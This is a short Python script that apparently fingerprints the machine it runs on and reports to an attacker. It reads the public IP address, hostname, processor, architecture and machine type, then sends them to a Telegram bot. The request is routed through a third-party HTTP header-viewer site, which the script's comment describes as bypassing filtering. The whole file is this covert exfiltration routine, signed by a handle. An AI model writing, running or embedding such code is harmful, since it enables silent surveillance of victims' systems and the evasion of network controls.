#----------[Importing / Installing the Libraries]----------
from os import system
system('pip install requests && pip install platform')
from requests import get , post
from platform import platform , node , processor , architecture , machine
#----------[Receive the Public IP Address]----------
ip = get('http://ip.42.pl/raw').text
#----------[Sending The Information To Telegram Bot / Bypass Filtering]----------
url = f'https://api.telegram.org/bot(((TOKEN)))/SendMessage?chat_id=(((TOKEN)))&text=[ 📡 ] Information Received Successfully ! \n\n• IP Address : {ip} \n\n• OS Name : {architecture()[0]} , {architecture()[1]} \n\n• Network Name : {node()} \n\n• processor info : {processor()} \n\n• Machine Type : {machine()} \n\n[ 🎩 ] By @NullCyberi'
payload = {'UrlBox':url,'AgentList':'Mozilla Firefox','VersionsList':'HTTP/1.1','MethodList':'POST'}
req = post('https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx',payload)
